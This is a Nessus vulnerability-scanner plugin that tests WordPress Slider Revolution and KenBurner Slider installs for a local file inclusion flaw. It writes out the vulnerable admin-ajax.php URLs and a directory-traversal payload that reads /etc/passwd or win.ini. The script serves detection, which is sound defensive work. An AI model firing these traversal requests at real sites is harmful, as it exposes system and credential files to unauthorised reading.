#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(80475);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/06 17:22:03 $");

  script_bugtraq_id(68942);
  script_osvdb_id(109645);
  script_xref(name:"EDB-ID", value:"34511");

  script_name(english:"Multiple Slider Plugins for WordPress 'img' Parameter Local File Inclusion Vulnerability");
  script_summary(english:"Attempts to view the wp-config.php file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file inclusion vulnerability.");
  script_set_attribute(attribute:"description", value:
"A Slider plugin for WordPress hosted on the remote web server is
affected by a local file inclusion vulnerability due to a failure to
properly sanitize user-supplied input to the 'img' parameter of the
'image_view.class.php' script. This allows an unauthenticated, remote
attacker to read arbitrary files by forming a GET request containing
directory traversal sequences.

Slider plugins known to be affected are :

  - Responsive KenBurner Slider
  - Slider Revolution Responsive

Themes known to include affected Slider plugins are :

  - Avada Theme
  - Centum Theme
  - CuckooTap Theme
  - IncredibleWP Theme
  - Medicate Theme
  - Striking Theme
  - Ultimatum Theme");
  script_set_attribute(attribute:"see_also", value:"http://marketblog.envato.com/news/plugin-vulnerability/");
  script_set_attribute(attribute:"see_also", value:"http://www.themepunch.com/home/plugin-update-information/");
  # http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9dc3ba1c");

  script_set_attribute(attribute:"solution", value:
"Upgrade the vulnerable plugins to the updated versions below :

  - Responsive KenBurner Slider version 1.8
    - Slider Revolution Responsive version 4.2");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"WordPress Slider Revolution Responsive File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/07/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/02/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/01/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

vuln_plugins = make_list(
  "Responsive KenBurner Slider",
  "Slider Revolution Responsive"
);

vuln_plugin = branch(vuln_plugins);

vuln_plugins_and_inst_urls = make_array(
  "Responsive KenBurner Slider", "wp-content/plugins/kbslider/js/kb_admin.js",
  "Slider Revolution Responsive", "wp-content/plugins/revslider/js/rev_admin.js"
);
vuln_plugins_and_inst_checks = make_array(
  "Responsive KenBurner Slider", make_list("var KBSliderAdmin", "kenburn_type_1"),
  "Slider Revolution Responsive", make_list("var RevSliverAdmin", "UniteAdminRev.ajax")
);
vuln_plugins_and_vuln_urls = make_array(
  "Responsive KenBurner Slider", "wp-admin/admin-ajax.php?action=kbslider_show_image&img=",
  "Slider Revolution Responsive", "wp-admin/admin-ajax.php?action=revslider_show_image&img="
);

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+vuln_plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  c_url = vuln_plugins_and_inst_urls[vuln_plugin];
  checks[c_url][0] = vuln_plugins_and_inst_checks[vuln_plugin];

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir + "/",
    port   : port,
    ext    : vuln_plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, vuln_plugin + " plugin");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln = FALSE;
foreach file (files)
{
  attack =  mult_str(str:"../", nb:12);
  url = vuln_plugins_and_vuln_urls[vuln_plugin] + attack + file;

  res = http_send_recv3(
    method       : "GET",
    item         : dir + "/" + url,
    port         : port,
    exit_on_fail : TRUE,
    follow_redirect: 1
  );
  body = res[2];

  # Check for errors
  error_returned = FALSE;
  if (
    !isnull(body) &&
    (
      # magic_quotes_gpc
      (attack + '\\0/wp-load.php): failed to open stream:' >< body) ||
      (attack + '\\0/wp-load.php) [function.' >< body) ||
      (attack + '\\0/wp-load.php'+") [<a href='function." >< body) ||
      # open_basedir
      ("Failed opening required '" + attack >< body) ||
      ("open_basedir restriction in effect. File(" + attack >< body)
    )
  ) error_returned = TRUE;
  pat = file_pats[file];

  if ((body =~ pat) || (error_returned))
  {
    attack_req = install_url + url;
    vuln = TRUE;
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, vuln_plugin + " plugin");

line_limit = 10;
if (error_returned)
{
  output = res[2];
  snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\n' + 'Nessus was not able to exploit the issue, but was able to verify it'+
    '\n' + 'exists by examining the error message returned from the following' +
    '\n' + 'request :' +
    '\n' +
    '\n' + attack_req +
    '\n' +
    '\n' + snip +
    '\n' + beginning_of_response(resp:output, max_lines:line_limit) +
    '\n' + snip +
    '\n';
  security_warning(port:port, extra:report);
  exit(0);
}
else
{
  output = body;

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : file,
    line_limit  : line_limit,
    request     : make_list(attack_req),
    output      : chomp(output),
    attach_type : 'text/plain'
  );
}
